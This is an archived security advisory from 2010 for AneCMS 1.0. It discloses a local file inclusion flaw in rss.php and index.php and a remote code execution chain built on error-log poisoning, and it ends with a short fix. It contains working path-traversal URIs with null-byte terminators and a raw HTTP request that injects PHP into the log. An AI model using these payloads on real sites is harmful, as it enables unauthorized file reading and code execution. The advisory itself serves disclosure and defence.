@@ -1,0 +1,92 @@
+id: 11787
+date: 04/11/2010
+title: Ane CMS Multiple Vulnerabilities
+author: BugReport
+cves: 
+
+================================
+Ane CMS Multiple Vulnerabilities
+================================
+
+##########################www.BugReport.ir########################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:		AneCMS Multiple Vulnerabilities
+# Vendor:		http://anecms.com/
+# Vulnerable Version:	1.0 (Latest version till now)
+# Exploitation:		Remote with a RAW HTTP packet sender
+# Fix:			N/A
+###################################################################################
+
+####################
+- Description:
+####################
+
+AneCMS is a small and fast CMS completely modular. Written in PHP with  
+JS(jQuery), Multilanguage, Skinnable
+and has an online repository of modules accessible from the ACP of the  
+CMS. Using MySQL as the backend DBMS.
+
+
+####################
+- Vulnerability:
+####################
+
++--> Local File Inclusion (LFI)
+	The AneCMS try to locate local files for responding users according  
+to GET parameters. There are 25 infected
+	files, but approximately whole of them are protected else of the  
+'index.php' and 'rss.php' files. Check the
+	exploits section for the details.
+
++--> Remote Code Execution
+	With a RAW HTTP packet sender, you can send unescaped php code to  
+AneCMS. Then this code can be executed using
+	the LFI vulnerability. Check the exploits section for the details.
+
+####################
+- Exploits/PoCs:
+####################
+
++--> Exploiting The Local File Inclusion (LFI)
+	For the 'rss.php', you can select local file relative path from the  
+'modules' directory using 'module' GET
+	parameter. For example following URI can be used for inspecting the  
+'.htaccess' file:
+	http://target.com/rss.php?module=../.htaccess%00
+	For the 'index.php', you can select local file relative path from the  
+'system/ajax' directory using 'ajax' GET
+	parameter. For example following URI can be used for inspecting the  
+'.htaccess' file:
+	http://target.com/index.php?ajax=../../.htaccess%00
+
++--> Remote Code Execution
+	This attack should be done in two phases. First use the LFI to inject  
+the desired php code in the web server
+	log file. Then use the LFI again to execute it.
+	For example if you want to run '<?php echo "ShahShah..."; ?>' code,  
+first send the following HTTP packet:
+		GET /rss.php?module=../<?php echo "ShahShah..."; ?>%00 HTTP/1.0
+		Host: target.com
+		User-Agent: UA
+
+	This packet will inject the '<?php echo "ShahShah..."; ?>' in the  
+error logs. Then visit following URI:
+	http://target.com/rss.php?module=../the/path/to/logs/folder/logs/php_error.log%00
+
+	Above URI will include the error log (including your injected code)  
+and execute it.
+
+####################
+- Solution:
+####################
+
+Instead of generating the inclusion path by GET parameters directly,  
+check the value of the parameter and
+then include the valid hard-coded file path.
+
+
+
+
+#  0day.today [2023-03-25]  #
